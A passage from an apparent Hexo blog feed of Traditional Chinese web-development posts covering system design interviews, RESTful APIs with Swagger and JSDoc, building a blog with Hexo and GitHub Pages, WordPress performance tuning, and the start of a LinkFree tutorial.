title="系統設計面試流程"></a>系統設計面試流程</h3><ul><li>對象: 通常會針對比較資深的工程師來進行</li><li>進行方式: 會像是實際上工作的討論</li><li>目的: 了解過去遇過的問題以及處理經驗</li></ul><p>通常都會以一個範圍比較大且有想像空間的題目開始，但通常會先限縮範圍</p><ul><li>如果要設計比特幣的報價跟交易量呈現，你會怎麼設計</li><li>臉書的個人發佈動態跟顯示，顯示追蹤的朋友動態</li></ul><h3 id="系統設計面試進行方式"><a href="#系統設計面試進行方式" class="headerlink" title="系統設計面試進行方式"></a>系統設計面試進行方式</h3><p>在跟面試官互動的過程中會需要</p><ol><li>先確認功能以及相關條件，剛開始都沒有給太多限制</li><li>決定可能會用到的元件在白板上畫架構圖</li><li>針對架構圖做簡單的說明</li><li>資料傳遞的格式</li></ol><p>在畫架構圖的過程中，通常也會被問問題</p><ul><li>你要用什麼 DB 為什麼決定用這個?</li><li>RDB 跟 NoSQL 差別在哪</li><li>表要怎麼開，欄位怎麼關聯，資料打算怎麼放</li></ul><p>在畫了相關元件跟架構圖後，會開始延伸可能的條件或是想要實作的功能</p><ul><li>即時交易量要怎麼做到</li><li>怎麼決定要顯示哪些朋友的動態，你的資料庫會怎麼決定</li><li>如果今天要加入按讚或是推文訊息的更新要怎麼做</li></ul>]]></content>
      
      
      <categories>
          
          <category> 前後端如何和平相處 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 職涯發展 </tag>
            
            <tag> 網站技術 </tag>
            
            <tag> Backend </tag>
            
            <tag> 前後端如何和平相處 </tag>
            
            <tag> 2022ironman </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>RESTful API 是什麼?該怎麼理解?</title>
      <link href="/2022/09/15/relationships-between-frontend-and-backend/backend-restful-api/"/>
      <url>/2022/09/15/relationships-between-frontend-and-backend/backend-restful-api/</url>
      
        <content type="html"><![CDATA[<p>在這系列的前幾篇文章著重在個體，探討了網頁端是怎麼由 HTML 組成以及透過 CSS 長成什麼樣子，這篇文章會來介紹前後端溝通的重要觀念 API。</p><h2 id="什麼是-API"><a href="#什麼是-API" class="headerlink" title="什麼是 API"></a>什麼是 API</h2><p>API (Application Programming Interface)，中文是應用程式介面，介面是用於程式間溝通的抽象概念。</p><blockquote><p>溝通，重要的是訊息的交換</p></blockquote><p>以男女交往來說重要的溝通是</p><ul><li>丟球: 會不會丟球，不會丟球對方就不知道該怎麼和你進一步互動</li><li>接球: 對方丟球該怎麼接到，該怎麼看到球飛過來</li></ul><p>人與人之間的情感，就是透過傳接球這個介面來慢慢讓感情升溫的，搞不清楚介面，會憑實力單身。</p><p>API 介面在前後端之間扮演的角色就是提供請求和回覆的格式和規範，在設計 API 的時候，對 API 而言重要的是</p><ul><li><strong>傳入</strong>: 收到什麼樣子的參數</li><li><strong>傳出</strong>: 回傳什麼樣子的結果</li></ul><p>當我們完整的定義了 “<strong>傳入</strong>“ 和 “<strong>傳出</strong>“ 參數的樣子後，也就完成了 API 的設計。</p><p>前後端之間溝通重要的<strong>傳入</strong>和<strong>傳出</strong>是</p><ul><li>Request: 前端向後端請求資料</li><li>Response: 後端回覆前端的請求</li></ul><h3 id="什麼是-Request"><a href="#什麼是-Request" class="headerlink" title="什麼是 Request"></a>什麼是 Request</h3><p>Request 是瀏覽器向後端取得資料的方式，一個 Request 通常包含以下參數</p><ul><li>URL: 要跟後端的哪個路徑互動</li><li>method: HTTP method</li><li>headers: Client Request 的相關資訊</li><li>body: 資料類型且需要傳輸的內容大多會存放在此</li><li>credntial: 像是同源政策類的設定</li></ul><h3 id="什麼是-Response"><a href="#什麼是-Response" class="headerlink" title="什麼是 Response"></a>什麼是 Response</h3><p>Response 則是定義了瀏覽器可以取得的資料格式，一個 Response 通常包含以下參數</p><ul><li>headers: Server Response 的相關資訊</li><li>body: 資料類型且需要傳輸的內容大多會存放在此</li><li>status: 回應請求的狀態</li><li>statusText: 狀態相關的訊息</li></ul><h2 id="什麼是-RESTful-API"><a href="#什麼是-RESTful-API" class="headerlink" title="什麼是 RESTful API"></a>什麼是 RESTful API</h2><p>REST (Representational State Transfer) 是一種依照資源來設計 API 界面的一種架構，透過架構來定義 API 的<strong>傳入</strong>和<strong>傳出</strong>該如何去組成和設計，通常 RESTful API 會是在講基於 HTTP 通訊協定上的介面服務設計。</p><blockquote><p>資源指的是任何可以讓用戶端存取的物件、資料、服務</p></blockquote><p>資源必須具有識別碼 (ID) 也就是 URI 來讓用戶進行存取，接著會透過 REST 這種交換資源的表示法來與資源互動。</p><p>舉女孩子喜歡吃的美食當例子</p><ul><li><strong>傳入</strong>: <code>/users/ariel/favorite-food-list/</code></li><li><strong>傳出</strong>: 甜點店清單、火鍋店清單、早午餐店清單</li></ul><p>RESTful API 會使用標準的 HTTP method 當作動詞來對資源進行操作</p><ul><li>GET: 取得資料</li><li>POST: 新增資料</li><li>PUT: 修改資料</li><li>DELETE: 刪除資料</li></ul><p>依照 RESTful API 來設計 API 的 URI 應該避免把動詞放在 URI 中 <code>/create-favorite-food-list/</code> 較好的方式會是 <code>/favorite-food-list/</code> + POST。</p><p>一般來說 URI 中的資源都會是複數名詞，並且透過階層來描述資源之間的關係:</p><ul><li><code>/users/ariel</code>: 代表取得 ariel 這個使用者的相關資訊</li><li><code>/users/ariel/favorite-food-list/</code>: 代表 ariel 的美食清單</li></ul><p>不過一般建議階層最多就是兩層即可，避免造成設計上的複雜以及使用彈性的下降。</p><p>在對資源操作過後，在<strong>傳出</strong>時也有幾個常用的狀態碼</p><ul><li>200: 成功</li><li>201: 已建立</li><li>204: 沒有內容</li><li>400: 無效的請求</li><li>404: 找不到</li><li>409: 衝突，通常會用在 PUT 失敗</li></ul><h2 id="OpenAPI-Specification"><a href="#OpenAPI-Specification" class="headerlink" title="OpenAPI Specification"></a>OpenAPI Specification</h2><p>OpenAPI Specification 是一種機器可讀介面文件的規範，用來描述、生成、使用和視覺化 RESTful Web 服務。</p><p>常聽到的產品會是 Swagger，以前 OpenAPI 是 Swagger 框架的一部分，在 2016 年後成為一個獨立項目，受到 Linux 基金會的一個開源協作項目 OpenAPI Initiative 監督。</p><h3 id="Swagger"><a href="#Swagger" class="headerlink" title="Swagger"></a>Swagger</h3><p>Swagger 是 REST API 的工具，可以自動建立清晰明瞭的 REST API 文件，在開發流程上幫助設計、構建、記錄和使用 REST API。</p><p>推薦大家可以直接使用線上的編輯器去體驗，傳送門在此:</p><p><a href="https://editor.swagger.io/">https://editor.swagger.io/</a></p><p>原則上就是透過編輯 yaml 檔來定義 API 的<strong>傳入</strong>和<strong>傳出</strong>，貼上最基本範例，定義了 book 相關的 API 和參數內容。</p><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">swagger:</span> <span class="string">&quot;2.0&quot;</span></span><br><span class="line"><span class="attr">info:</span></span><br><span class="line">  <span class="attr">description:</span> <span class="string">&quot;API 文件&quot;</span></span><br><span class="line">  <span class="attr">version:</span> <span class="string">&quot;1.0.0&quot;</span></span><br><span class="line">  <span class="attr">title:</span> <span class="string">&quot;Swagger Book Store&quot;</span></span><br><span class="line"><span class="attr">host:</span> <span class="string">&quot;swagger.io&quot;</span></span><br><span class="line"><span class="attr">basePath:</span> <span class="string">&quot;/v1&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="attr">schemes:</span></span><br><span class="line">  <span class="bullet">-</span> <span class="string">&quot;https&quot;</span></span><br><span class="line">  <span class="bullet">-</span> <span class="string">&quot;http&quot;</span></span><br><span class="line"><span class="attr">paths:</span></span><br><span class="line">  <span class="string">/api/v1/book/&#123;bookId&#125;:</span></span><br><span class="line">    <span class="attr">get:</span></span><br><span class="line">      <span class="attr">tags:</span></span><br><span class="line">        <span class="bullet">-</span> <span class="string">&quot;Book&quot;</span></span><br><span class="line">      <span class="attr">summary:</span> <span class="string">&quot;Find Book by ID&quot;</span></span><br><span class="line">      <span class="attr">description:</span> <span class="string">&quot;For valid response try integer IDs with value &gt;= 1&quot;</span></span><br><span class="line">      <span class="attr">operationId:</span> <span class="string">&quot;getBookById&quot;</span></span><br><span class="line">      <span class="attr">produces:</span></span><br><span class="line">        <span class="bullet">-</span> <span class="string">&quot;application/json&quot;</span></span><br><span class="line">      <span class="attr">parameters:</span></span><br><span class="line">        <span class="bullet">-</span> <span class="attr">name:</span> <span class="string">&quot;bookId&quot;</span></span><br><span class="line">          <span class="attr">in:</span> <span class="string">&quot;path&quot;</span></span><br><span class="line">          <span class="attr">description:</span> <span class="string">&quot;ID of pet that needs to be fetched&quot;</span></span><br><span class="line">          <span class="attr">required:</span> <span class="literal">true</span></span><br><span class="line">          <span class="attr">type:</span> <span class="string">&quot;integer&quot;</span></span><br><span class="line">          <span class="attr">maximum:</span> <span class="number">10.0</span></span><br><span class="line">          <span class="attr">minimum:</span> <span class="number">1.0</span></span><br><span class="line">          <span class="attr">format:</span> <span class="string">&quot;int64&quot;</span></span><br><span class="line">      <span class="attr">responses:</span></span><br><span class="line">        <span class="attr">&quot;200&quot;:</span></span><br><span class="line">          <span class="attr">description:</span> <span class="string">&quot;successful operation&quot;</span></span><br><span class="line">          <span class="attr">schema:</span></span><br><span class="line">            <span class="string">$ref:</span> <span class="string">&quot;#/definitions/Book&quot;</span></span><br><span class="line">        <span class="attr">&quot;400&quot;:</span></span><br><span class="line">          <span class="attr">description:</span> <span class="string">&quot;Invalid ID supplied&quot;</span></span><br><span class="line">        <span class="attr">&quot;404&quot;:</span></span><br><span class="line">          <span class="attr">description:</span> <span class="string">&quot;Order not found&quot;</span></span><br><span class="line"><span class="attr">definitions:</span></span><br><span class="line">  <span class="attr">Book:</span></span><br><span class="line">    <span class="attr">type:</span> <span class="string">&quot;object&quot;</span></span><br><span class="line">    <span class="attr">properties:</span></span><br><span class="line">      <span class="attr">id:</span></span><br><span class="line">        <span class="attr">type:</span> <span class="string">&quot;integer&quot;</span></span><br><span class="line">        <span class="attr">format:</span> <span class="string">&quot;int64&quot;</span></span><br></pre></td></tr></table></figure><h2 id="JS-Doc"><a href="#JS-Doc" class="headerlink" title="JS Doc"></a>JS Doc</h2><p>如果不使用 REST 的規範又想要額外撰寫相關的<strong>傳入</strong>和<strong>傳出</strong>，Node 的後端通常會需要透過 <strong>JSDoc</strong> 註解產生 API 文件。</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * Represents a book.</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@constructor</span></span></span><br><span class="line"><span class="comment"> * <span class="doctag">@param</span> &#123;<span class="type">string</span>&#125; <span class="variable">title</span> - The title of the book.</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@param</span> &#123;<span class="type">string</span>&#125; <span class="variable">author</span> - The author of the book.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">Book</span>(<span class="params">title, author</span>) &#123;&#125;</span><br></pre></td></tr></table></figure><p>只要下指令安裝 <code>npm install jsdoc</code>，然後就可以直接 <code>jsdoc yourJavaScriptFile.js</code> 在短短幾秒內自動生成出網頁版的 API 文件。</p><p>不過檔案內容當然要搭配上特殊的註解 <code>/**</code> 開頭，這樣才可以被 <strong>JSDoc</strong> 辨識出來。</p>]]></content>
      
      
      <categories>
          
          <category> 前後端如何和平相處 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 網站技術 </tag>
            
            <tag> Backend </tag>
            
            <tag> 前後端如何和平相處 </tag>
            
            <tag> 2022ironman </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>用 Hexo 和 Github Pages 建立部落格吧</title>
      <link href="/2022/09/14/relationships-between-frontend-and-backend/tool-hexo-blog/"/>
      <url>/2022/09/14/relationships-between-frontend-and-backend/tool-hexo-blog/</url>
      
        <content type="html"><![CDATA[<p>前幾年在小編當工程師時常常逛 Github，發現有些人會利用這個空間來開部落格，於是稍微研究後就決定動手做一個，也就是大家現在所看到的前端三分鐘。</p><p>在另外一篇文章小編介紹過<a href="https://linyencheng.github.io/2022/09/13/relationships-between-frontend-and-backend/tool-wordpress/">想架站不會寫網頁，那就用 WordPress 吧</a>，這篇文章就來推薦對於網站技術略懂略懂的工程師們另外一個架站選擇 Hexo。</p><p>同樣的以男女交往首先還是外在的條件、談吐等等要超過可交往的門檻，而 Hexo 的佈景主題跟外掛系統已架站來說在小編看來是相當有幫助的。</p><h2 id="Github-Pages"><a href="#Github-Pages" class="headerlink" title="Github Pages"></a>Github Pages</h2><p>Github 本來就有提供專案放置解說 (README.md) 頁面的功能，利用 <a href="https://pages.github.com/">GitHub Pages</a> + <a href="http://jekyllrb.com/">Jekyll</a> 就可以快速產生，不過樣式就像是大家看到的稍微單調和基礎一點。</p><p>除了使用內建的 Jekyll 協助將 markdown 語法轉換成網頁，當然也提供直接使用 html 的方式。</p><p>延伸閱讀: 怎麼<a href="https://linyencheng.github.io/2022/09/12/relationships-between-frontend-and-backend/html-link-free/">用 LinkFree 製作一個 Github Pages 取代 LinkTree</a>，一起來試看看吧!</p><h2 id="什麼是-Hexo"><a href="#什麼是-Hexo" class="headerlink" title="什麼是 Hexo"></a>什麼是 Hexo</h2><blockquote><p>Hexo: A fast, simple &amp; powerful blog framework</p></blockquote><ul><li>支援佈景主題</li><li>支援外掛系統</li><li>支援 <strong>Markdown</strong> 語法，提升寫作速度</li><li>提供將程式碼內嵌的功能，適合工程師使用</li></ul><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="title function_">autoDetect</span>(<span class="params"></span>) &#123;</span><br><span class="line">  <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;ye, it is written in JavaScript!&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>小編使用幾年下來的心得是其實真的蠻簡單的，也沒什麼大問題，搭配已經設計好的佈景主題，簡單修改後就可以開始進入寫部落格的階段了。</p><p>底下是官方寫的 Quick Start，只需要短短五行指令就可以讓部落格跑起來。</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">npm install hexo-cli -g</span><br><span class="line">hexo init blog</span><br><span class="line">cd blog</span><br><span class="line">npm install</span><br><span class="line">hexo server</span><br></pre></td></tr></table></figure><h3 id="Hexo-配置"><a href="#Hexo-配置" class="headerlink" title="Hexo 配置"></a>Hexo 配置</h3><p>所有相關的基礎配置都會在 _config.yml，透過外掛系統安裝進來的外掛也會在這裡進行設定。</p><p>官方已經有提供了教學影片，提供傳送門在此給大家:</p><iframe width="560" height="315" src="https://www.youtube.com/embed/A0Enyn70jKU" title="YouTube video player" frameborder="0" allow="accelerometer; autoplay; clipboard-write; encrypted-media; gyroscope; picture-in-picture" allowfullscreen></iframe><h3 id="Hexo-佈景主題"><a href="#Hexo-佈景主題" class="headerlink" title="Hexo 佈景主題"></a>Hexo 佈景主題</h3><p>Hexo 打開會有預設的主題，社群也提供了大量客製化的<a href="https://hexo.io/themes/">佈景主題</a>供大家選擇:</p><p><a href="https://hexo.io/themes/">https://hexo.io/themes/</a></p><p>每個主題的安裝方式略有不同，不過大致上安裝步驟如下:</p><ol><li>將套件執行指令安裝或下載</li><li>在 themes 資料夾中確認有加入模板</li><li><code>_config.yml</code> 中指定並設定主題相關配置</li></ol><h3 id="Hexo-外掛"><a href="#Hexo-外掛" class="headerlink" title="Hexo 外掛"></a>Hexo 外掛</h3><p>Hexo 除了佈景主題外也擁外掛系統，因此能夠輕鬆擴展功能而不用修改核心模組的原始碼。</p><p>在 Hexo 中有兩種形式的外掛：</p><p>腳本 (Scripts): 只需要把 JavaScript 檔案放到 scripts 資料夾，在啟動時就會自動載入一次，像小編會把 google tag manager 相關的服務都寫在腳本裡。<br>套件 (Packages): 較複雜且需要透過 npm 管理</p><p><a href="https://hexo.io/plugins/">https://hexo.io/plugins/</a></p><h4 id="Hexo-Packages"><a href="#Hexo-Packages" class="headerlink" title="Hexo Packages"></a>Hexo Packages</h4><ul><li>網站地圖<ul><li>hexo-generator-sitemap</li><li>hexo-generator-seo-friendly-sitemap</li></ul></li><li>標籤 (Tag)<ul><li>hexo-generator-tag</li></ul></li><li>分類<ul><li>hexo-generator-category</li></ul></li><li>閱讀時間<ul><li>hexo-reading-time</li></ul></li><li>相關、熱門文章<ul><li>hexo-related-popular-posts</li></ul></li><li>產生 RSS<ul><li>hexo-generator-feed</li></ul></li><li>發佈網站到 Github Page<ul><li>hexo-deployer-git</li></ul></li><li>PWA<ul><li>hexo-pwa</li></ul></li><li>網站內容轉換成投影片<ul><li>hexo-generator-slidehtml</li></ul></li></ul><h3 id="Hexo-文章撰寫"><a href="#Hexo-文章撰寫" class="headerlink" title="Hexo 文章撰寫"></a>Hexo 文章撰寫</h3><p>Hexo 的資料夾結構中分成</p><ul><li><code>_draft</code>: 撰寫草稿</li><li><code>_post</code>: 撰寫正式貼文</li></ul><p>撰寫文章可以透過兩個方式</p><ul><li>執行指令 <code>npx hexo new test</code><ul><li>產生 test.md 到 _post</li><li>產生 test 資料夾到 _post 給文章存取圖片等靜態檔案</li></ul></li><li>直接透過習慣的編輯器建立檔案</li></ul><p>記得產生的 markdown 最上面會需要文章的基本資訊，最基本的格式如下:</p><figure class="highlight md"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">---</span><br><span class="line">title: test-test</span><br><span class="line">date: 2022-09-18 09:44:05</span><br><span class="line"><span class="section">tags:</span></span><br><span class="line"><span class="section">---</span></span><br></pre></td></tr></table></figure><h3 id="Hexo-產生靜態-HTML-檔案"><a href="#Hexo-產生靜態-HTML-檔案" class="headerlink" title="Hexo 產生靜態 HTML 檔案"></a>Hexo 產生靜態 HTML 檔案</h3><blockquote><p><code>hexo generate</code></p></blockquote><p>透過一行指令即可完成。</p><h2 id="網域設定"><a href="#網域設定" class="headerlink" title="網域設定"></a>網域設定</h2><p>如果有購買網域，則需要讓網域指向我們剛剛設定好的主機。</p><ul><li>DNS 代管設定 (主網域、子網域)</li><li><a href="https://www.whatsmydns.net/">測試工具</a></li></ul><p>如果是需要使用 Github Page 只需要開好 Repository。</p><p>舉我的帳號為例如果是 Root 的專案，Repository 的名稱要叫做 <code>linyencheng.github.io</code>。</p><p>網站連結就會是: <a href="https://linyencheng.github.io/">https://linyencheng.github.io/</a></p><h2 id="網站地圖-sitemap-xml"><a href="#網站地圖-sitemap-xml" class="headerlink" title="網站地圖 (sitemap.xml)"></a>網站地圖 (sitemap.xml)</h2><p>檔名一般會是叫 <code>sitemap.xml</code>，搜尋引擎會透過爬蟲依照網站地圖的資訊來對網站進行檢索。</p><h3 id="robots-txt"><a href="#robots-txt" class="headerlink" title="robots.txt"></a>robots.txt</h3><p>除了網站地圖也可以設定 <code>robots.txt</code>，主要是告訴搜尋引擎哪些路徑不需要被檢索及公開。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">User-agent: *</span><br><span class="line">Disallow: /cgi-bin/</span><br><span class="line">Disallow: /images/</span><br><span class="line">Disallow: /tmp/</span><br><span class="line">Disallow: /private/</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> 前後端如何和平相處 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 網站技術 </tag>
            
            <tag> 雲端服務 </tag>
            
            <tag> 前後端如何和平相處 </tag>
            
            <tag> 2022ironman </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>想架站不會寫網頁，那就用 WordPress 吧</title>
      <link href="/2022/09/13/relationships-between-frontend-and-backend/tool-wordpress/"/>
      <url>/2022/09/13/relationships-between-frontend-and-backend/tool-wordpress/</url>
      
        <content type="html"><![CDATA[<p>不會寫程式也可以架設網站甚至賺錢?! 隨著科技的進步，答案是可以的。</p><p>近年來各種軟體都轉換成服務的形式 (SaaS)，透過網路就可以存取和使用並達到預期結果。</p><p>那不太會認識女孩子也可以交到女朋友嗎?! 就讓我們來看下去。</p><h2 id="什麼是-WordPress"><a href="#什麼是-WordPress" class="headerlink" title="什麼是 WordPress"></a>什麼是 WordPress</h2><p>WordPress 是以 PHP 和 MySQL 為平台的自由開源的部落格軟體和內容管理系統，並且擁有相當豐富的模板系統、外掛程式可以直接使用。</p><p>等等，那不會 PHP 和 MySQL 的人該怎麼辦?</p><p>那就是直接使用網路上現成的託管服務即可。</p><p>當我們使用託管服務或是自己架設起 WordPress 後，就能夠透過後臺管理介面來維護我們的網站。</p><p>一段感情從認識到交往，大致上可分幾個階段：陌生 -&gt; 認識 -&gt; 好感 -&gt; 曖昧 -&gt; 交往，這個過程並不是單向也不是只能按照順序。</p><p>使用託管服務相當於讓你有機會直接從陌生到交往。</p><h3 id="WordPress-佈景主題"><a href="#WordPress-佈景主題" class="headerlink" title="WordPress 佈景主題"></a>WordPress 佈景主題</h3><p>當然男女交往首先還是外在的條件、談吐等等要超過可交往的門檻，WordPress 的佈景主題則是協助了這個部分。</p><p>Avada (Fushion Builder) 跟 OceanWP (Elementor) 這兩套都是小編體驗過的編輯器佈景主題，透過選擇佈景主題可以讓網站的外在條件迅速達到可交往的門檻。</p><p>Avada 小編的公司曾經付錢購買過，功能真的是非常非常的豐富，OceanWP 則是可以搭配免費版本 Elementor 使用。</p><p>熟悉佈景主題，就跟需要好好打理外表一樣重要。</p><h2 id="什麼是-Avada"><a href="#什麼是-Avada" class="headerlink" title="什麼是 Avada"></a>什麼是 Avada</h2><p>相信很多人在入門時，很可能是在看了一些部落客的文章後，在毫無概念的情況下選擇了主題 Avada。</p><p>Avada 並不是不好，只是蠻容易讓新手遇到問題，遇到問題之後可能就會開始求助於社群，社群裡當然就會遇到很多那些年一起踩過坑的大家。</p><p>我是一個前端工程師，所以直接從網站的效能面來看，因為 Avada 是一個相對完整的主題，這也代表著初學者的我們，很可能只是用大砲打小鳥，加上剛開始又使用較一般的機台，跑著一大包完整的功能，自然網站速度也就慢了。</p><p>這像是一個男生做了很多事情，可是卻沒做在正確的重點上，最後卻變成工具人而不是秋森萬一樣。</p><p>而網站的速度就像是釋放和接收到對方的意圖，丟球跟接球就相當於網站的速度。</p><h3 id="Builder-優化"><a href="#Builder-優化" class="headerlink" title="Builder 優化"></a>Builder 優化</h3><p>Builder 是佈景主題的頁面編輯器，提供我們所見及所得的方式去編輯、修改網站。</p><p>完整的主題中包含了很多的功能，在啟用主題底下相關功能的時，同時也需要在使用時下載相關的資源檔，這意味者我們開啟的功能越多，需要下載的資源檔越多，這時候速度也就自然被拖慢了。</p><blockquote><p>怕你買到被閹割的，預設值全功能開啟</p></blockquote><p>那這些功能性的資源檔在網站中主要會分為兩種：</p><ul><li>腳本 (.js) ，腳本語言包含相關邏輯</li><li>樣式檔 (.css)，樣式檔則是顯示的樣子</li></ul><p>也就是說通常你打一個勾多啟用一個功能通常就會多一組資源檔。</p><p>小編使用 Avada 時是搭配 Fushion Builder，當然 Elementor 也是類似的概念，建議未使用到的功能建議就直接停用。</p><p>另外 Avada 主題選項中，有提供 Performance 選項做相關調整及優化，主要可調整的項目：</p><ul><li>Litebox 功能若未使用可以停用</li><li>google font 若需要使用請改用 CDN 的選項</li><li>JS 的編譯</li><li>圖片的懶載入</li></ul><p>就像女孩子有時候會說，有時候就是要她喜歡才重要，不然再多東西可能都算是多餘的。</p><h2 id="系統面優化"><a href="#系統面優化" class="headerlink" title="系統面優化"></a>系統面優化</h2><p>除了外掛跟部景主題外，從工程面我們可以從系統面著手。</p><h3 id="優化執行環境"><a href="#優化執行環境" class="headerlink" title="優化執行環境"></a>優化執行環境</h3><ul><li>PHP 版本及相關設定，可以從以下看到：<ul><li>Avada 裡面 System Status</li><li>工具裡頭的 Site Health</li></ul></li><li><a href="https://www.litespeedtech.com/">Litespeed</a> 伺服器，市占率較低，但<a href="https://www.litespeedtech.com/products/litespeed-web-server/compare-litespeed-apache-nginx">官網說有較好的效能</a></li></ul><h3 id="設定-WordPress-快取"><a href="#設定-WordPress-快取" class="headerlink" title="設定 WordPress 快取"></a>設定 WordPress 快取</h3><p>網站在渲染頁面時，一般會分成下面三種情境：</p><ul><li>伺服器端動態渲染：資料庫的存取 -&gt; 存取後的運算 -&gt; 最終動態渲染的產生</li><li>伺服器端靜態檔案：Prerender 成一個靜態檔案</li><li>瀏覽器端渲染：只取網站中骨架，部分資料等網站載入後才透過瀏覽器去取得及抽換</li></ul><p>WordPress 會是屬於第一種，在頁面 render (渲染) 的過程中，會需要好幾道手續。</p><p>在還沒裝外掛之前你只要拿個壓力測試工具打一下，很容易就可以看到 cpu 99.99% 了。</p><p>為了加速這樣的過程我們就需要安裝快取的外掛 (ex: WP Super Cache, <a href="https://wordpress.org/plugins/wp-fastest-cache/">WP Fastest Cache</a>)，進行這幾道手續的優化，這個目的主要是將動態渲染的部分進行加速。</p><h3 id="圖片資源使用-CDN"><a href="#圖片資源使用-CDN" class="headerlink" title="圖片資源使用 CDN"></a>圖片資源使用 CDN</h3><p><a href="https://zh.wikipedia.org/wiki/CDN">CDN (Content Distribution Network)</a> 中文全名是內容傳遞網路。</p><p>簡單來說就是透過這樣的服務我們可以加速資源檔的載入速度，圖片過多又沒有進行相關的處理當然直接拖慢網站載入速度。</p><ul><li><a href="https://jetpack.com/support/site-accelerator/">jetpack</a> 提供將圖片使用免費 CDN 的功能</li><li>tinypng 也協助我們將圖片進行不失真的壓縮</li></ul>]]></content>
      
      
      <categories>
          
          <category> 前後端如何和平相處 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 網站技術 </tag>
            
            <tag> 雲端服務 </tag>
            
            <tag> 前後端如何和平相處 </tag>
            
            <tag> 2022ironman </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>用 LinkFree 製作一個 Github Pages 取代 LinkTree</title>
      <link href="/2022/09/12/relationships-between-frontend-and-backend/html-link-free/"/>
      <url>/2022/09/12/relationships-between-frontend-and-backend/html-link-free/</url>
      
        <content type="html"><![CDATA[<h2 id="什麼是-LinkTree"><a href="#什麼是-LinkTree" class="headerlink" title="什麼是 LinkTree"></a>什麼是 LinkTree</h2><p>LinkTree 是一頁傳送門，透過 IG 的個人檔案連結來做相關行銷與各平台的串聯。</p><p>透過 LinkTree 整合 Facebook、Line、Youtube、TG、網站和或棟訊息等等。</p><p>透過這個免費的服務就可以輕鬆製作，想要交個女朋友首先要讓很多女生可以認識你。</p><p>所以就讓我們來看看該怎麼製作個人的靜態的 LinkTree 頁面吧。</p><h2 id="什麼是-LinkFree"><a href="#什麼是-LinkFree" class="headerlink" title="什麼是 LinkFree"></a>什麼是 LinkFree</h2><p>LinkFree 是一套開源的解決方案，畢竟就是寫個網頁，如果略懂略懂 HTML、CSS、JavaScript 的話，小編還是相當推薦自己來製作看看的，底下附上小編的 LinkFree 頁面給大家</p><p><a href="https://linyencheng.github.io/LinkFree/">https://linyencheng.github.io/LinkFree/</a></p><p>接下來的範例主要會以底下這個 Template 來解說</p><p><a href="https://github.com/MichaelBarney/LinkFree/tree/master/Templates/3D%20Theme">https://github.com/MichaelBarney/LinkFree/tree/master/Templates/3D%20Theme</a></p><p>作者所提供的 Demo 頁面</p><p><a href="https://michaelbarney.github.io/LinkFree/Templates/3D%20Theme/">https://michaelbarney.github.io/LinkFree/Templates/3D%20Theme/</a></p><p>Repo</p><p><a href="https://github.com/MichaelBarney/LinkFree">https://github.com/MichaelBarney/LinkFree</a></p><p>這是最終預覽的畫面</p><p><img src="https://raw.githubusercontent.com/farellfaiz/LinkFree/master/Templates/3D%20Theme/preview.png" alt="Preview" title="Preview"></p><h2 id="LinkFree-頁面原始碼解析"><a href="#LinkFree-頁面原始碼解析" class="headerlink" title="LinkFree 頁面原始碼解析"></a>LinkFree 頁面原始碼解析</h2><ol><li>加入空的 HTML 結構</li></ol><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span 